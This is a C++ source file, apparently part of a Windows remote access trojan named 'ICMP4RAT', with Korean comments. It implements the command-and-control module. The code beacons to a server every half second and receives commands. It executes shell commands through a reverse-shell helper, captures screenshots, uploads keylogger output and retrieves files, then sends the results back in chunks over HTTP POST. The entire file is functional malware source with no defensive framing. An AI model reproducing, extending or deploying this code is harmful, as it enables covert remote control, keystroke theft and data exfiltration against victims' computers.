#include <stdlib.h>
#include <iostream>
#include <string>
#include <map>
#include <ole2.h>
#include <olectl.h>
#include <list>
#include <sstream>
#include <thread>
#include <mutex>
#include "cncManager.h"
#include "commandManager.h"
#include "keyLogger.h"

cncManager::cncManager() {
}


cncManager::cncManager(LPCWSTR server) {
	this->server = server;
}

cncManager::~cncManager() {
}

/* C&C에 http request를 보내는 함수. send후 response parsing을 호출함. */
void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
    //std::lock_guard<std::mutex> guard(this->m1);
    HINTERNET
        hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    BOOL bResults = FALSE;
     hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_ASYNC);

    if (hSession)
         hConnect = WinHttpConnect(hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);

    if (hConnect)
         hRequest = WinHttpOpenRequest(hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;

    if (hRequest)
        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, dlen, dlen, 0);

    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    if (!bResults)
        std::cout << "Error" << GetLastError() << "has occurred." << std::endl;

    if (bResults)
    {
        do
        {
            /*Check for available data.*/
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            {
                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                break;
            }

            // No more available data.
            if (!dwSize)
                break;

            // Allocate space for the buffer.
            LPSTR pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                break;
            }

            // Read the Data.
            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
                printf("Error %u in WinHttpReadData.\n", GetLastError());

            else
                this->responseParser((UCHAR*)pszOutBuffer, dwSize);

            delete[] pszOutBuffer;

            if (!dwDownloaded)
                break;

        } while (dwSize > 0);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    

}   
/* C&C에 데이터 보내는 함수. sendHttpRequest를 Wrapping함. */
void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
    if (dlen <= DATA_BUF_SIZE) {
        DDprotocol* dataFrame = new DDprotocol;
        dataFrame->type = DDtype;
        dataFrame->len = dlen;
        dataFrame->seq = 0;

        UCHAR* stream = new UCHAR[sizeof(DDprotocol) + dlen];
        memset(stream, 0, sizeof(DDprotocol) + dlen);
        memcpy(stream, dataFrame, sizeof(DDprotocol));
        memcpy(stream + sizeof(DDprotocol), data, dlen);

        this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + dlen);
        delete dataFrame;
        delete[] stream;
        
    }
    else {
        DWORD seq = 1;
        ULONG64 left_offset = dlen, sended_offset = 0;
    
        while(left_offset > DATA_BUF_SIZE){
            DDprotocol* dataFrame = new DDprotocol;
            dataFrame->type = DDtype;
            dataFrame->len = DATA_BUF_SIZE;
            dataFrame->seq = seq;
            UCHAR* stream = new UCHAR[DATA_BUF_SIZE + sizeof(DDprotocol)];
            memset(stream, 0, sizeof(DDprotocol) + DATA_BUF_SIZE);
            memcpy(stream, dataFrame, sizeof(DDprotocol));
            memcpy(stream + sizeof(DDprotocol), (LPVOID)((UCHAR *)data + sended_offset), DATA_BUF_SIZE);
            this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + DATA_BUF_SIZE);
            seq++;
            left_offset -= DATA_BUF_SIZE;
            sended_offset += DATA_BUF_SIZE;
            delete[] stream;
            delete dataFrame;
        }
        if (left_offset) {
            DDprotocol* dataFrame = new DDprotocol;
            dataFrame->type = DDtype;
            dataFrame->len = left_offset;
            dataFrame->seq = LAST_SEQUENCE;

            UCHAR* stream = new UCHAR[sizeof(DDprotocol) + left_offset];
            memset(stream, 0, sizeof(DDprotocol) + left_offset);
            memcpy(stream, dataFrame, sizeof(DDprotocol));
            memcpy(stream + sizeof(DDprotocol), (UCHAR*)data + sended_offset, left_offset);

            this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + left_offset);
            delete dataFrame;
            delete[] stream;
        }
    }


}
/* C&C에 beacon 보내는 함수. sendHttpRequest를 Wrapping함.*/
/* 이 함수는 별도 스레드로 돌려야할듯. */
void cncManager::sendBeacon() {
	DDprotocol* beaconFrame = new DDprotocol;
	beaconFrame->type = beaconRequest;
	beaconFrame->len = 0;
	beaconFrame->seq = 0;

	while (TRUE) {
		this->sendHttpRequest((LPVOID)beaconFrame, sizeof(DDprotocol));
		Sleep(500);
	}
}

void cncManager::responseParser(UCHAR* res, DWORD len) {
    if (len < sizeof(DDprotocol))
        std::cout << "Invalid Protocol !!!" << std::endl;
    
    else
    {
        DDprotocol* resData = new DDprotocol;
        resData->header = res[0];
        resData->type = res[1];
        resData->len = *(DWORD *)(res+2);
        resData->seq = *(DWORD *)(res+6);

        if (resData->header != DDPROTO_HEADER)
            std::cout << "Invalid Header !!!" << std::endl;

        else {
            std::string data = (char*)(res + 10);
            /* response 핸들러 구현부 */
            switch (resData->type)
            {
                case ACK:
                {
                    //this->printParsedResponse(resData, "ACK");
                    break;
                }

                case error:
                {
                    this->printParsedResponse(resData, "ERROR");
                    break;
                }                            

                case shellRequest:
                {
                    this->printParsedResponse(resData, "SEHLL_REQUEST");
                    std::istringstream spliter(data);
                    std::string tmp;
                    while (std::getline(spliter, tmp, ';')) {
                        this->shellCmd.push_back(tmp);
                    }
                  
                    std::thread shellHandler = std::thread(&cncManager::handleShellRequest, this);
                    shellHandler.detach();

                    break;
                }

                case ftpRequest:
                {
                    /* 스샷 요청 처리 */
                    if (!data.compare("screenshot")) {
                        this->printParsedResponse(resData, "SCREENSHOT_REQUEST");
                        std::thread screenHandler = std::thread(&cncManager::handleScreenRequest, this);
                        screenHandler.detach();
                    }
                    /* 키로그 처리 */
                    else if (!data.compare("keylog")) {
                        std::thread keyLogHandler = std::thread(&cncManager::handleKeyLog, this);
                        keyLogHandler.detach();
                    }
                    /* 파일 요청 처리 */
                    else {
                        this->printParsedResponse(resData, "FTP_REQUEST");
                        std::thread ftpHandler = std::thread(&cncManager::handleFtpRequest, this,data);
                        ftpHandler.detach();
                    }
                    break;
                }
            
                case none:
                {
                    this->printParsedResponse(resData, "NONE");
                    break;
                }
                
                default:
                {
                    this->printParsedResponse(resData, "TYPE_ERROR");
                    break;
                }
                
            }

            delete resData;
        }
    }

}

void cncManager::printParsedResponse(DDprotocol* resData,std::string type) {
    if (this->print_setting) {
        std::cout << "==parsed data==" << std::endl;
        std::cout << "header : " << resData->header << std::endl;
        std::cout << "type :" << type << std::endl;
        std::cout << "length :" << resData->len << std::endl;
        std::cout << "sequence :" << resData->seq << std::endl;
        std::cout << "===============" << std::endl;
    }

}

void cncManager::handleShellRequest() {
    std::lock_guard<std::mutex> guard(this->m2);
    commandManager commander;
    std::string result;
        while (!this->shellCmd.empty()) {
            result = commander.reverseShell(this->shellCmd.front());
            this->sendData(shellResponse, result.size(), (LPVOID)result.c_str());
            this->shellCmd.pop_front();
        }
}

void cncManager::handleFtpRequest(std::string path) {
    commandManager commander;
    commander.getFile(path,this->server);
}

void cncManager::handleScreenRequest() {
    commandManager commander;
    LPVOID ptr = commander.getScreen();
    this->sendData(ftpResponse, commander.screen_len, ptr);
    delete[] ptr;
    
}

// 키로그 전송
void cncManager::handleKeyLog() {
    keyLogger logger;
    std::string log = logger.getKeyLog();
    this->sendData(ftpResponse, log.length(), (LPVOID)log.c_str());
    logger.clearLog();
}